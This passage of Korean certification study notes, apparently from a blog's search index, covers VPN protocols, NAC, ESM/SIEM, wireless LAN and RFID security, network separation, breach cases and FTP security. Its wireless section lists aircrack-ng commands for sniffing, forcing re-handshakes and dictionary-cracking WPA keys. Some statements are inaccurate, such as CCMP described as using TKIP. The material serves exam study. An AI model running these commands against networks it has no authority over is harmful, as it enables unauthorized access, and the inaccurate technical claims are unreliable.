IPSEC VPN   1. IPSEC(IP Security) VPN     보안에 취약한 인터넷에서 안전한 통신을 실현하는 통신 규약   가상적인 전용 회선을 구축하여 데이터를 도청당하는 등의 행위를 방지하기 위한 통신 규약   2. IPSEC 터널링 모드           ESP Transport mode          이미지 출처            ESP Tunnel mode          이미지 출처       IPSEC의 전송 모드는 데이터에 대해 암호화를 수행하지만, IP 헤더에 대해서는 암호화를 수행하지 않음   터널 모드는 보안 IPSEC 헤더를 추가하고 IP 헤더와 데이터 모두를 암호화함.   3. IPSEC VPN 전송 모드                  종류       설명                       터널모드       VPN과 같은 구성으로 패킷의 출발지에서 일반 패킷이 보내지면 중간에서 IPSec 을 탑재한 중계 장비가 패킷 전체를 암호화(인증)하고 중계 장비의 IP 주소를 붙여 전송                 전송모드       패킷의 출발지에서 암호화(인증)를 하고 목적지에서 복호화가 이루어지므로 End-to-End 보안을 제공           4. IPSEC VPN 키 관리 담당                  종류       설명                       ISAKMP       ⦁ Internet Security Association and Key Management Protocol ⦁ Security Association 설정, 협상, 변경, 삭제 등 SA 관리와 키 교환을 정의했으나 키 교환 메커니즘에 대한 언급은 없음                 IKE       ⦁ Internet Key Exchange, 키 교환 담당 ⦁ IKE 메시지는 UDP 프로토콜을 사용해서 전달되며 출발지 및 도착지 주소는 500 port를 사용하게 됨           5. IPSEC VPN 인증과 암호화를 위한 Header                  종류       설명                       AH       ⦁ 데이터 무결성과 IP 패킷의 인증을 제공, MAC 기반 ⦁ Replay Attack으로부터 보호 기능(순서번호 사용)을 제공 ⦁ 인증 시 MD5, SHA-1 인증 알고리즘을 이용하여 Key 값과 IP 패킷의 데이터를 입력한 인증 값을 계산하여 인증 필드에 기록 ⦁ 수신자는 같은 키를 이용하여 인증 값을 검증                 ESP       ⦁ 전송 자료를 암호화하여 전송하고 수신자가 받은 자료를 복호화하여 수신 ⦁ IP 데이터그램에 제공하는 기능으로서 데이터의 선택적 인증, 무결성, 기밀성, Replay Attack 방지를 위해 사용 ⦁ AH와 달리 암호화를 제공(대칭키, DES, 3-DES 알고리즘) ⦁ TCP/UDP 등의 Transport 계층까지 암호화할 경우 Transport 모드를 사용 ⦁ 전체 IP 패킷에 대해 암호화할 경우 터널 모드를 사용           6. AH(Authentication Header) 세부 구조                  필드       크기       내용                       Next Header       1Byte       다음에 오는 헤더를 연결하기 위해서 헤더의 프로토콜 번호를 담고 있음                 Payload Length       1Byte       AH 길이를 측정                 Reservation       2Byte       ‘0’으로 설정                 SPI       4Byte       Destination IP Address와 ESP(Encapsulating Security Payload)를 조합하여 데이터그램에 대한 SA(Security Association)를 식별                 Sequence Number       4Byte       SA(Security Association)이 구성될 때 ‘0’으로 초기화되는 특성을 지니고 있음. SA를 사용하여 데이터그램이 송신될 때마다 값이 증가하며, 데이터그램을 식별하여 데이터그램의 재전송을 방지함으로써 재생 공격으로부터 IPsec을 방어하는 데 사용                 Authentication Data       -       무결성 검사 값(ICV; Integrity Check Value)으로 구성되어 있음           7. ESP(Encapsulation Security Payload) 세부 구조                  필드       크기       내용                       SPI(ESP Header)       4       Destination IP Address와 ESP(Encapsulating Security Payload)를 조합하여 데이터그램에 대한 SA(Security Association)를 식별                 Sequence Number(ESP Header)       4       SA(Security Association)이 구성될 때 ‘0’으로 초기화되는 특성을 지니고 있음. SA를 사용하여 데이터그램이 송신될 때마다 값이 증가하며, 데이터그램을 식별하여 데이터그램의 재전송을 방지함으로써 재생 공격으로부터 IPsec을 방어하는 데 사용                 Payload Data(Payload)       -       다음 헤더 필드에 의해 묘사된 데이터를 포함하는 가변 길이 필드                 Padding(ESP Trailer)       0~255       암호화 또는 정렬을 위해서 추가적인 패딩 바이트가 포함된 필드                 Padding Length(ESP Trailer)       1       패딩 필드의 바이트 수                 Next Header(ESP Trailer)       1       다음 헤더의 프로토콜 번호를 포함하여 헤더를 연결하는 데 사용                 ESP Authentication Data       -       ESP 인증 알고리즘을 적용하여 계산된 ICV(Integrity Check Value)값으로 구성           4. PPTP VPN     PPTP(Point-to-Point Tunneling Protocol) VPN   PPP(Point-to-Point Protocol)의 Packet을 IP Packet으로 Encapsulation 하여 IP 네트워크에 전송하기 위한 터널링 기법으로 2계층에서 동작한다.   Microsoft의 RAS(Remote Access Service)에 기반한다.   5. L2TP VPN     L2TP(Layer 2 Tunneling Protocol) VPN   L2F 프로토콜(Cisco에서 제안)과 PPTP 프로토콜과의 호환성을 고려하여 만들어진 터널링 프로토콜   2계층 데이터 링크에서 동작한다.   NAC(Network Access Control)   1. 개요     엔드 포인트(End Point) 보안 솔루션으로 등록되지 않은 단말기를 식별하여 차단   NAC는 네트워크에 연결된 단말기에 대해서 사전에 IP주소, MAC주소를 등록하고 등록되지 않은 단말기의 네트워크 접근을 차단   네트워크에 대한 무결성을 지원   NAC 정책 관리 서버는 등록된 단말기를 관리하고 차단 조건을 설정하여 등록되지 않은 단말기가 네트워크 연결을 시도하면 차단하는 기능이 있다.   2. NAC 구성요소     정책관리 서버(Policy Management Server)            네트워크에 대한 정책등록 및 에이전트(Agent) 정책 설정, 네트워크 접근 로그관리를 관리한다.       단말기(PC)의 보안상태를 모니터링하고 사용자 역할 기반 정책을 수립한다.       차단 서버 및 에이전트에 대해서 동작을 설정한다.           차단 서버(Policy Enforcement Server)            네트워크에 연결된 단말기를 통제한다.       단말기(PC)의 IP 주소, MAC 주소, 운영체제 정보를 수집하고 분류한다.       웹 기반 사용자 인증을 지원한다.       유해 트래픽을 감지하고 차단한다.           에이전트(Agent)            사용자 단말기에 설치되고 보안정책을 점검한다.       사용자 단말기의 취약점 점검 및 단말기 정보를 확인한다.       무선인증을 지원한다.           콘솔(Console)            웹(Web) 기반으로 네트워크 보안정책 설정, 감사, 모니터링을 한다.       대시보드(Dashboard)를 제공하고 주요 네트워크 이벤트에 대해서 알람을 발생시킨다.           3. NAC 주요 기능     네트워크 정보 자동 수집 및 업데이트 지원            네트워크 장비, 사용자 단말기, 네트워크 프린터, 무선 AP(Access Point) 등의 정보를 자동으로 수집하고 분류       Agent 방식 : 사용자 단말기의 윈도우 환경, 설정 정보 등의 자세한 정보를 수집       Agentless 방식 : ARP 프로토콜을 사용해서 사용자 단말기 정보를 수집 - 정보 수집에 한계           IP 관리 및 충돌 보호            특정 IP 주소 및 MAC 주소에 대해서 네트워크 차단 및 해제       사용자 네트워크 사용기간을 등록해서 제한       장기간 미사용 IP 주소를 탐지, IP 주소를 자동회수       사용자가 임의의 IP주소 변경 방지, 충돌 방지           인증 서버 연동            사용자 인증 시 Active Directory, Local Database 인증, RADIUS 인증, LDAP 인증과 연동                    RADIUS 인증 : 무선 LAN 에서 사용하는 소규모 단방향 인증                       즉, NAC 자체 인증 기능을 사용할 수도 있고 다른 인증과 연동하여 서비스를 제공할 수도 있음           네트워크 접속 강제화 및 필수 프로그램 설치유도            사용자 단말기에 설치된 프로그램을 확인해서 필수적으로 설치해야 하는 프로그램을 강제적으로 설치하게 할 수 있음       보안정책 실행을 위해 필요한 프로그램이 설치되지 않은 경우 강제적으로 네트워크를 연결하여 필수 프로그램을 설치함           보안 무결성 확인            사용자 단말기의 보안 패치를 확인하고 운영체제 패스워드 안정성을 확인       윈도우 시스템 설정을 검증하고 웹브라우저 보안 설정, 공유 폴더를 점검           무선AP(Access Point) 정보수집 및 비인가 무선 AP접속 통제            무선 AP 정보를 자동으로 수집해서 NAC 정책 서버로 전송       NAC 관리자에 의해서 화이트 리스트(White List) 기반 무선 AP를 관리하고 통제           DHCP            정책 서버와 차단 서버 모두 동적으로 IP를 할당하는 DHCP 기능을 지원           4. NAC 동작 방식                  구분       Agent 방식       Agentless 방식                       특징       사용자 단말기 NAC Agent를 설치       사용자 단말기에 별도의 Agent를 설치할 필요가 없음                 접근제어       ⦁ IP, MAC, Port, Protocol 별 접근 제어 ⦁ 사용자별 접근 제어       ⦁ IP, MAC, Port, Protocol 별 접근 제어 ⦁ 사용자별 접근 제어                 장점       Patch지원, 하드웨어 및 프로세스 정보, 백신 연동 등       ⦁ Agent 설치 없이 IP 관리, 사용자 PC에 연결된  스위치 및 포트 정보 ⦁ 호스트명, 도메인명 관리 등           ESM (Enterprise Security Management)   1. 개요     다수 보안 시스템을 통합한 통합 보안관제 시스템   침입차단 시스템, 침입탐지 시스템, VPN 등의 각종 이벤트를 수집하고 분석   2. ESM 주요 기능     통합 보안관제 업무            정보보안 정책을 등록하고 자산 및 자원을 관리       실시간 종합관제가 지원되어 침입발생 시 탐지가 가능       각종 보안로그 및 이벤트에 대한 조회, 분석, 대응관리 지원       실시간 보안감사, 위험도 추론 침입탐지, 상관성 분석을 지원           ESM Agent 관리            ESM Agent에 대해서 정보보안 정책을 실행하게 통제할 수 있음       수집해야 하는 로그 정보, 각종 이벤트 등을 관리           분석 보고서 관리            보안 제품별 보고서 및 통합 보고서를 작성하고 로그를 분석해서 각종 통계 보고서를 자동 생성       스케줄러를 사용해서 자동적으로 보고서를 생성           3. ESM 구성요소      이미지 출처      ESM Agent            ESM Agent는 각종 보안 솔루션의 로그를 수집하는 역할 수행       실시간으로 로그를 수집하여 정규 표현식으로 변환 후 ESM Manager에게 전달           ESM Manager            ESM Manager는 로그를 데이터베이스에 저장하고 위협분석, 상관성 분석, 위험도 추론 침입탐지 등의 분석을 함       SSL을 사용하여 ESM Agent에서 ESM Console로 명령을 전달           ESM Console            ESM Console은 모든 보안정보를 모니터링하며 침입 발생 시 명령을 ESM Manager 에게 전달한다.       각종 침입에 대한 알람이 발생하며 통합 보안관제 화면을 제공함           4. SIEM 과 ESM 차이점     SIEM(Security Information Event Management)는 통합 보안관제 부분 측면에서는 ESM과 거의 유사한 통합보안 솔루션   SIEM과 ESM 모두 각종 보안 솔루션으로부터 로그를 수집하고 분석하는 기능을 함   ESM은 수집된 로그 및 분석정보를 데이터베이스에 저장하고 관리   SIEM은 빅데이터를 사용해서 대용량의 로그정보를 보관하고, 각 컬럼별 인덱싱이 가능하여 빠르게 데이터를 분석함   SIEM은 대용량의 로그 파일을 삭제하지 않고 빅데이터에 저장   빅데이터는 NoSQL을 기반으로 하여 칼럼에 대해 모두 인덱스를 만들고 MapReduce, Mahout등을 사용해서 분석                  구분       SIEM       ESM                       특징       기업의 모든 자원의 정보 및 로그를 통합해서 수집한다.       보안 솔루션 위주의 로그를 수집하고 통합한다.                 수집정보       보안 시스템, 보안 소프트웨어, 네트워크 장비, 애플리케이션 로드, 이벤트, 구성 정보, 시스템 정보, 웹 로그 등       보안 시스템, 서버 시스템 로그, 이벤트 등으로 수집되는 로그가 한정적                 분석       ⦁ 사용자, Port, IP, 애플리케이션 등의 작은 단위로 분석이 가능 ⦁ APT 공격 및 알려지지 않은 패턴에 대해서 분석       ⦁ 시그니처 중심으로 분석 ⦁ IP, Port 단위 분석과 알려진 패턴 위주의 분석                 기반기술       ⦁ 빅데이터 기술인 MapReduce, Indexing 등을 사용 ⦁ 고성능의 데이터 분석이 가능       ⦁ Agent 혹은 API를 사용해서 로그를 수집 ⦁ 관계형 데이터베이스의 테이블에 데이터를 입력하고 분석           무선 LAN 보안 기법   1. 무선 LAN(Wireless Local Area Network)     LAN 기반 망과 단말기 사이를 무선주파수(RF: Radio Frequency)를 이용하여 전송하는 근거리 통신 기술   무선 LAN 표준 IEEE 802 위원회에서 진행            WWAN : CDMA, LTE (100~200Km) - IEEE 802.16       WMAN : Mobile WIMAX (20~30Km) - IEEE 802.16       WLAN : IEEE 802.11a, IEEE 802.11.b/g/n (50m) - IEEE 802.11       WPAN : Zigbee, Bluetooth, uwb (3~5m) - IEEE 802.15           무선 LAN 은 모바일 노드(노트북, 센서)가 AP(Access Point)에 연결되고 AP는 인터넷과 유선으로 연결된 구조   전송되는 무선 신호를 쉽게 도청할 수 있으며 DDoS와 같은 형태의 공격에도 취약   2. SDR (Software Defined Radio)     무선네트워크를 수신받기 위한 안테나와 소프트웨어로 구성   무선 네트워크를 수신받아서 처리            주파수를 수신받아 재생공격(Replay Attack) 가능       신호를 소프트웨어로 변환하고 변조해서 IoT 서비스를 공격           3. 무선 LAN(Local Area Network) 보안 요소                  기능       내용                       인증(Authentication)       ⦁ 무선 LAN 사용을 위한 AP(Access Point) 인증 ⦁ 무선 LAN 단말에 대한 인증 기능                 암호화(Encryption)       무선 LAN 구간에서 안전한 데이터 통신을 위한 기밀성, 무결성을 지원           4. 무선 LAN 보안 기술   1. SSID(Service Set ID)     무선 LAN 서비스 영역을 구분하기 위한 식별자로 AP(Access Point)는 동일한 SSID를 가진 클라이언트만 접속을 허용하는 방법   2. WEP(Wired Equivalent Privacy)      이미지 출처      개요            IEEE 802.11b 에서 표준화한 데이터 암호화 방식       AP 와 단말기 간 RC4 대칭형 암호화 알고리즘을 사용한 40bit키를 사용       24bit 길이의 초기화 벡터(IV : Initialization Vector)에 연결되어 64bit 혹은 128bit WEP 키열을 생성하여 해당 키를 통해 암호화를 수행       키열을 활용하여 정적으로 키를 사용하므로 무작위 공격과 같은 방법으로 키를 유추할 수 있음       Dynamic WEP : 세션 별로 키를 변경할 수 있음           WEP 인증의 문제점            초기백터(IV)의 재사용 : 24비트 짧은 길이의 IV가 재사용될 수 있다.       취약한 RC4 암호화 사용 : 암호키 노출의 가능성이 크다.       단방향 인증 구조 : 중간자 공격 (Main in the middle attack) 이나 Session hijacking에 취약       단순한 CRC-32 알고리즘 사용 : 무선 패킷 전송 시 패킷의 위/변조 공격에 취약           3. WPA(Wi-Fi Protected Access) : IEEE 802.1x/EAP     WEP의 정적 키 관리에 대한 문제점을 해소할 수 있다.   128bit 동적 암호화 및 복호화를 수행   TKIP(Temporal Key Integrity Protocol)방식으로 사용자, 네트워크 세션, 전송 프레임 별로 키를 동적으로 생성   4. WPA2(Wi-Fi Protected Access) : IEEE 802.11i     2세대 WPA로 보안 기능이 개선됨   128bit 이상의 키를 사용하는 AES(Advanced Encryption Standard) 암호화, 사전 인증 및 캐시로 구성   5. IEEE 802.11i     WPA 방식의 암호화 알고리즘은 AES(Advanced Encryption Standard)를 사용한다.   CCMP(Counter Mode Encryption Protocol)는 RC4 암호화 알고리즘 대신 TKIP 블록 암호화 방법을 사용하고 AES 암호화 사용, 즉 블록 암호화 방식에 인증을 강화함   6. 무선 LAN 공격 기법     WPA는 인증 시 4-Way Handshaking을 사용하고, 이 과정 중에 사전파일을 대입하여 패스워드를 복호화함                  구분       설명                       iwconfig       컴퓨터 시스템에 설치되어 있는 무선 LAN 카드를 확인                 Monitor 모드       ⦁ airmon-ng start &lt;WLAN 명&gt; 을 실행하여 모니터 모드로 변경 ⦁ iwconfig 명령을 실행하여 등록된 mon0 을 확인                 스니핑(Sniffing)       airodump-ng mon0 를 실행하여 무선 LAN 패킷(Packet)을 스니핑함                 DDoS 공격       ⦁ Handshaking을 다시 발생하게 하여 피해자를 대상으로 DDoS 공격을 수행 ⦁ aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;LAN MAC&gt; mon0 ⦁ 3은 30,000의 트래픽을 발생시킴                 크랙(Crack)       ⦁ aircrack-ng를 실행하여 크랙을 수행함 ⦁ aircrack-ng -b &lt;AP MAC&gt; -w &lt;사전파일&gt; &lt;패킷파일&gt;           RFID 보안   1. RFID/USN     Radio Frequency Identification &amp; Ubiquitous Sensor Network   Micro-chip을 내장한 Tag, Label, Card 등에 저장된 Data를 무선 주파수를 이용하여 Reader기가 자동으로 인식하는 기술            ID 바코드 : 바코드 번호 Read Only 기반 식별, 유통관련 서비스       RFID : 무선주파수 R/W Tag, 컨테이너,우편,도서       USN : Ad-hoc Net (별도의 베이스 스테이션 없음) 기반 센서간 서비스, Zigbee(IEEE802.15.4), 상시접속           2. RFID 보안 기술                  보안 기술       내용                       Kill Tag       사용자 요청에 따른 태그 무효화                 Faraday Cage 원리       주파수를 차단할 수 있는 차폐망을 이용                 방해전파       RFID 태그의 신호를 인식할 수 없도록 방해전파 전송                 Blocker Tag       외부침입을 막기 위한 차단 태그                 재 암호화 방법       암호화 된 RFID 태그 정보를 다시 정기적으로 암호화                 Active Jamming       태그와 판독기 간 사전 약속된 의미없는 전자신호 발생, 부당한 판독기를 정상적으로 통신하지 못하도록 방해           NAT  1. Dynamic NAT     내부의 사설 IP가 라우터 혹은 NAT 소프트웨어에 의해서 미리 정해진 공인 IP로 랜덤하게 매핑   정해진 공인 IP가 모두 사용 중일 경우 나머지 사설 IP는 공인 IP로 사용할 수 없다.   2. Static NAT     특정 사설 IP가 특정 공인 IP만 사용하도록 관리자가 미리 지정하는 방법   3. PAT(Port Address Translation)     PAT는 포트 변환을 통해서 공인 IP 하나만 있어도 많은 수의 사설 IP가 외부로 나갈 수 있다.  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크 보안","네트워크 대응 기술"],
        "url": "https://bluesplatter.com/is_certification/ISCert-02Network-03Secure/",
        "teaser": null
      },{
        "title": "02.네트워크 보안 - 04.최신 네트워크 위협 및 대응 기술",
        "excerpt":"네트워크 보안 위협의 이해  1. 악성메일 공격     과정            2016년 인터파크의 특정 직원에게 악성코드 메일 전송       내부망에서 악성코드를 포함한 메일을 확인       악성코드를 사용해 파일 공유 서버에 접근       파일 공유서버를 통해 개인정보취급자 PC에 접근       데이터베이스 연결정보를 사용해 개인정보를 유출           결과            방송통신위원회로부터 과징금과 과태료 부과                처분 사유                                  구분           내용                                           최대 접속시간 미제한           ⦁ 개인정보처리 시스템에 대한 최대 접속시간 제한을 하지 않음 ⦁ 보안성이 떨어진 가상화 방식을 사용 ⦁ 개인정보처리자 PC에 원격 데스크톱 방식의 공유설정을 허용 ⦁ 공유계정의 아이디와 패스워드를 모두 동일하게 설정                             비밀번호 암호화 미조치           ⦁ 최초 감염 PC에 내부 서버 및 PC에 접속할 수 있는 패스워드를 평문으로 기록하여 텍스트파일에 저장 ⦁ 사내 전산 장비의 IP와 패스워드를 엑셀파일 형태로 관리하여 평문으로 저장                             신고지연           정당한 사유없이 개인정보 유출 사실을 이용자에게 미통지 및 신고 지연                           2. APT 공격을 사용한 랜섬웨어     과정            2017년 6월 APT 공격과 랜섬웨어 공격을 결합한 공격       인터넷 나야나의 통신용 게이트웨이 서버와 호스팅 사업부 웹 서버를 해킹       거점을 확보한 후 153대 서버에 랜섬웨어 공격을 수행       3400개의 사이트 마비, 총 13억의 비용을 지불했지만 일부 서버는 복구에 실패                처분 사유                                  구분           내용                                           관리용 단말           웹 서버, 백업 서버 등 주요 서버에 접속할 수 있는 관리자 PC가 인터넷에서 접속이 가능했음                             서버 접근 통제           ID와 패스워드만으로 서버 접근이 가능하므로 계정탈취에 대한 대비가 부족                             관리적 보안           ⦁ 지능화된 해킹공격에 대응할 수 있는 정책 및 체계 부족 ⦁ 백업정책에 대한 관리체계 부족                           최신 네트워크 보안기술과 솔루션  1. 망분리     개요            인터넷망과 업무망을 차단하여 업무망을 보호하는 방법       방법 : 논리적 망분리, 물리적 망분리, 융합형 망분리       보안기술 : NAC, VPN, Firewall, IPS, UTM                망분리 단계                                  단계(수준)           내용                                           단말레벨           사용자가 인터넷용 컴퓨터와 업무용 컴퓨터를 분리해서 사용하는 단계                             네트워크 레벨           인터넷 접속 네트워크와 업무망이 분리된 형태                             업무 레벨           ⦁ 단말 레벨과 네트워크 레벨 망분리를 진행, 업무 프로세스를 재정립, 인터넷망에 있어야 하는 시스템과 업무망에 있어야 하는 시스템을 분리 ⦁ 개인정보 파일의 위치, 개인정보 취급자의 업무를 분석                           망분리 종류            물리적 망분리                    업무용 네트워크와 인터넷용 네트워크를 완전히 분리하는 구성, 네트워크 케이블(LAN) 공사 필요           보안성이 가장 우수한 방법, 업무자료 유출을 근본적으로 방지           사용자가 2대의 PC를 사용, 네트워크도 2개로 분리           인터넷용 PC, 업무용 PC                       논리적 망분리                    CBC(Client Based Computing)                            업무용 PC 1대를 사용하고 사용자 PC 가상 영역을 인터넷용 PC로 사용 (사용자 데스크탑 가상화)                                   SBC(Server Based Computing)                            업무용 PC 1대에 서버 접속용 프로그램을 사용               가상화 서버에 접속하여 인터넷을 사용하는 방식               중앙집중적 관리, 높은 효율성               이용자 수가 증가하면 지속적 증설이 필요                                               융합형 망분리                    사용자가 2대의 PC를 사용           하나의 네트워크를 가상화 기술로 사용           물리적 망분리에서 발생하는 LAN 공사가 필요 없음           보안 Client는 보안 GW(Gateway)와 보안터널(암호화)을 사용해서 통신           인터넷용 PC는 보안터널을 사용해 외부 인터넷으로 접근           업무용 PC는 일반 터널로 업무망에 접속                           2. 망분리 보안 요구사항(망분리 가이드)     인터넷용 PC에 대한 보안            인터넷용 PC에서의 문서작업은 원칙적으로 금지       업무상 인터넷용 PC에서 문서편집을 사용하려면 제한된 승인을 득해야 함       인터넷용 PC는 인터넷 메신저, 사내 웹하드 등을 금지, 필요시 제한적 허용           인터넷 메일 사용            기업의 외부 메일 서버는 인터넷망 구간에 구축, 인터넷용 PC로만 접근       사내 전용 메일 사용 시 인터넷용 PC는 접근 불가       내부 메일을 외부 메일 서버로 전송하거나 그 반대의 경우 자료 연계(망연계)를 사용해야 함           패치관리 시스템(Patch Management System)            업무용 패치관리 시스템은 외부 인터넷과 연결을 차단       관리자가 수동으로 패치파일을 다운로드, 무결성, 악성코드를 확인 후 시스템에 적용           업무용 PC관리            외부 메일 수신 및 인터넷 접속을 차단, 필요한 경우 관리자 승인 후 자료 연계(망간 자료전송)을 사용       PC, Wi-Fi 와 같은 무선 인터넷 연결을 차단           망간 자료 연계(자료 전송)            업무망과 인터넷망 간 자료 전송 시 자료 연계 서버를 사용해서 전송       자료 연계 서버는 외부망과 인터넷망에 각각 설치하고 운영           프린터 등 주변기기            네트워크 프린터는 인터넷망과 업무망에 각각 설치운영       인터넷망 프린터를 업무망에 공유하는 경우 프린터 서버를 추가적으로 설치           비인가된 단말의 네트워크 접근 통제            네트워크 접근은 인가된 PC만 허용       비인가된 PC의 접근은 차단되어야 하며 이를 위해 업무망과 인터넷망 각각에 NAC을 설치해야 함           사용자 단말 보안            사용자 단말인 업무용 PC와 인터넷용 PC를 보호하기 위해서 백신 설치, 패치 관리를 설치해야 한다.       사용자 단말에 대해서 중앙집중적인 보안 정책을 적용하고 관리해야 한다.           인터넷 PC 자료 저장 방지            인터넷용 PC에는 문서편집 프로그램을 무단으로 설치해서는 안된다.       인터넷용 PC에서 업무관련 문서를 생성, 보관하는 것을 금지하고 주기적으로 점검해야 한다.           보조 기억장치 관리 및 매체제어            인가된 보안 USB로만 읽기, 쓰기가 가능해야 한다.       비인가된 USB는 읽기만 가능하고 쓰기는 불가능해야 한다.       업무망과 인터넷망에 각각 매체 제어 시스템(DLP:Data Loss Prevention)을 설치한다.           3. 자료 연계     개념            자료 연계는 망분리 환경에서 개별망의 보안성과 독립성을 보장       안전한 데이터 송수신을 통해 컴플라이언스를 준수       인터넷망과 업무망으로 분리된 경우 인터넷망에 있는 파일을 업무망에 전송하거나 업무망에 있는 파일을 인터넷망으로 전송하는 방법                자료 연계 방식              이미지 출처              스토리지 연계 방식                    외부 자료 연계 서버와 내부 자료 연계 서버 간에 공유 스토리지를 사용           보안성이 높아서 정보보안 기반 시설 위주로 사용           높은 보안성과 대용량의 데이터 전송이 가능                       인피니밴드(InfiniBand) 연계 방식                    고속의 전송을 위해 메모리 전송방식을 사용해서 데이터를 송수신           금융권에서 고속으로 데이터를 전송할 때 많이 사용                       FC(Fiber Channel) 연계 방식                    망 간에 자료 전송량이 적은 소규모 환경에서 사용하는 방식                           자료 연계 주요 기능            외부망에서 내부망, 내부망에서 외부망 연계 : 파일 및 클립보드 내용전송       파일 전송 시에 결재 연동       바이러스 검사       확장자 검사 및 패턴검사 : 파일 확장자 및 파일 헤더를 검사하여 화이트 리스트 기반의 파일 전송       바인드 처리 : 업무망에서 인터넷망으로 접속해야 하는 경우, 바인드 IP를 부여하여 제한적으로 인터넷망으로 연결할 수 있도록 지원           4. 망분리 관련 법률     대상            교통, 원자력 발전소, 항공과 같은 사회기반 시설       정보보호 관리체계(ISMS, ISMS-P) 의무인증 대상자       전년도 말 기준 직전 3개월간 그 개인정보가 저장,관리되고 있는 이용자 수가 일일평균 100만명 이상이거나 정보통신서비스 부분 전년도 매출액이 100억원 이상인 정보통신서비스 제공자       국방부           정보통신망법 시행령 제 15조(개인정보의 보호조치)            전년도 말 기준 직전 3개월간 그 개인정보가 저장,관리되고 있는 이용자 수가 일일평균 100만명 이상이거나 정보통신서비스 부분 전년도 매출액이 100억원 이상인 정보통신서비스 제공자       개인정보처리시스템에 접속하는 개인정보취급자 컴퓨터 등에 대한 외부 인터넷망 차단       ISMS(ISMS-P) 의무인증 대상자           전자금융감독규정            금융회사 또는 전자금융업자       전산실 내에 위치한 정보처리시스템과 해당 정보처리시스템의 운영, 개발, 보안 목적으로 직접 접속하는 단말기에 대해서는 인터넷 등 외부통신망으로부터 물리적으로 분리할 것 (단, 업무 특성상 분리하기 어렵다고 금융감독원장이 인정하는 경우에는 분리하지 아니하여도 된다)          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크 보안","최신 네트워크 위협"],
        "url": "https://bluesplatter.com/is_certification/ISCert-02Network-04Latest/",
        "teaser": null
      },{
        "title": "03.애플리케이션 보안 - 01.인터넷 응용 보안",
        "excerpt":"FTP  1. FTP 개요  1. FTP (File Transfer Protocol)     인터넷에 연결된 시스템 간 파일을 전송하는 통신 프로토콜   TCP 프로토콜 사용   2. FTP 특징     명령 채널과 데이터 전송 채널이 독립적으로 동작            클라이언트가 명령 채널을 통해 서버에게 파일 전송을 요구       서버는 데이터 전송 채널을 통해 데이터를 전송           서버의 명령 채널은 21번 포트를 사용   데이터 포트는 전송 모드에 따라 포트 변경            Active Mode : 포트 20번       Passive Mode : FTP 서버가 자신의 데이터 포트를 결정           FTP 서비스는 보안에 취약(Sniffing) -&gt; sFTP 사용      이미지 출처      FTP 로그인 과정            3Way Handshaking       Recv : 220       Send : 사용자 ID       Recv : 331       Send : Password       Recv : 230 (로그인 성공)           3. FTP 종류                  종류       내용                       FTP       ID 및 Password 인증을 수행하고 TCP 프로토콜을 사용하여 사용자의 데이터를 송수신                 tFTP       인증 과정 없이 UDP 기반으로 데이터를 빠르게 송수신 함. 69번 포트 사용                 sFTP       전송 구간에 암호화 기법을 사용하여 기밀성을 제공           4. FTP 접근 통제 파일                  파일명       내용                       /etc/ftpusers       파일에 적용된 사용자에 대한 FTP 접근 제한                 /etc/hosts.deny       특정 IP의 접근 제한                 /etc/hosts.allow       특정 IP의 접근 허용           5. FTP Active Mode 와 Passive Mode     이미지 출처_FTP Active      이미지 출처_FTP Passive_                  전송방식       내용                       Active Mode       ⦁ Client : Server 21번 포트로 접속, 데이터채널 포트 제공 / Server : 응답 ⦁ Server : Client 제공 포트로 데이터채널 연결 요청 / Client : 응답                 Passive Mode       ⦁ Client : Server 21번 포트로 접속, PASV 모드 요청 / Server : 응답, 데이터채널 포트 (1024~65535 범위의 Random 포트) 제공 ⦁ Client : Server 제공 포트로 데이터채널 연결 요청 / Server : 응답           6. FTP 서비스 로그 기록     FTP 서비스 기동 시에 -l 옵션을 부여해서 실행하면 xferlog 파일을 기록   Sat Oct 29 21:35:39 2016 1 1.226.137.47 70 /home/devtest/aa.html a _ i r devtest ftp 0 * c            70 : 파일전송 크기       i : 파일 업로드       c : 성공 (i=실패)           Sat Oct 29 22:58:38 2016 1 110.15.241.24 70 /home/devtest/aa.html b _ o r devtest ftp 0 * c            o : 파일 다운로드           Thu Apr 8 15:40:32 2016 1 201.1.1.10 254 /usr/kisa.z b_o r test ftp 0 * c            Thu Apr 8 15:40:32 2016 1 : 접근 날짜 및 시간       201.1.1.10 : 접속 IP       254 : 전송 파일 Size       /usr/kisa.z : 전송 파일       b(Binary), a(ASCII) : 파일 종류       _(아무일도 수행하지 않음) : 행위       o(파일을 받았음) : 파일 동작       r(인증된 사용자) : 사용자 접근 방식       test : 로그인 ID       0(없음) : 인증 방법       c(전송성공) : 전송 상태           2. FTP 보안  1. FTP 보안 취약점                  취약점       내용                       Bounce Attack       ⦁ 익명 FTP 서버를 경유하여 호스트를 스캔 ⦁ 네트워크 포트 스캐닝을 위해서 사용 ⦁ FTP 바운스 공격을 통해서 전자메일을 보내는 공격을 Fake Mail이라고 함                 tFTP Attack       ⦁ 인증절차를 요구하지 않기 때문에 설정이 잘못되어 있으면 누구나 해당 호스트에 접근하여 파일을 다운로드 할 수 있음 ⦁ FTP보다 간단함                 Anonymous FTP Attack       ⦁ 보안 절차를 거치지 않은 익명의 사용자에게 FTP 서버 접근 허용 ⦁ 익명 사용자가 서버에 쓰기 권한이 있을 떄 악성코드 생성이 가능                 FTP 서버 취약점       wuftp 포맷 스트링 취약점 및 각종 버퍼 오버플로우 공격                 스니핑       ID 및 Password 입력 후 접속 시도 시 암호화가 이루어지지 않음. 네트워크 스니핑에 취약                 Brute Force Attack       무작위 대입법을 사용           2. FTP 보안대책     Anonymous            사용자의 Root 디렉터리, bin, etc, pub 디렉터리 소유자의 권한을 관리       $root/etc/passwd 파일에서 anonymous ftp에 불필요한 항목을 제거           tFTP            tFTP가 필요한 경우 secure mode로 운영           inetd FTP 서비스(inetd.conf 설정파일)            /etc/passwd 파일에 FTP 사용자를 /sbin/nologin 으로 설정           E-Mail 보안  1. E-Mail 전송 방법  1. SMTP(Simple Mail Transfer Protocol)     인터넷에서 전자우편을 보낼 때 사용되는 표준 통신 규약   E-Mail을 보내기 위해서 TCP 25번 포트를 사용   상대 서버를 지시하기 위해 DNS의 MX 레코드가 사용됨   OSI 7 계층의 응용 계층(Application Layer)에서 동작   2. POP3(Post Office Protocol Version 3)     응용 계층 프로토콜   원격 서버로부터 TCP/IP 연결을 통해 E-Mail을 읽어오는 데 사용   E-Mail을 읽은 후 원격 서버의 E-Mail을 삭제   TCP 110번으로 메일 